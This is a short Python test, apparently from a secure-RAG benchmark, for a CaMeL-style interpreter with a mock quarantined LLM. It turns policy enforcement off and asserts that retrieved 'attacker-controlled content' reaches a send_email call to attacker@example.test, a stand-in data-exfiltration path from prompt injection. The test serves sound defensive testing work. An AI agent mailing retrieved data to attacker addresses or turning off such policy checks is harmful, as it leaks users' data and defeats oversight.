from typing import Any

from secure_rag_bench.camel.interpreter import CaMeLInterpreter
from secure_rag_bench.camel.quarantined_llm import MockQuarantinedLLM


def test_monitor_disabled_allows_tainted_external_send() -> None:
    sent: list[dict[str, str]] = []

    def retrieve(query: str, top_k: int = 5) -> str:
        return "attacker-controlled content"

    def send_email(to: str, subject: str, body: Any) -> str:
        sent.append({"to": to, "subject": subject, "body": str(body)})
        return "sent"

    interpreter = CaMeLInterpreter(
        tools={"retrieve": retrieve, "send_email": send_email},
        quarantined_llm=MockQuarantinedLLM(),
        enforce_policy=False,
    )
    interpreter.execute(
        "docs = retrieve('project status')\n"
        "facts = quarantine_parse(docs, schema='DocumentSummary')\n"
        "send_email('attacker@example.test', 'data', facts)",
        user_query="Summarize project status",
    )

    assert len(sent) == 1
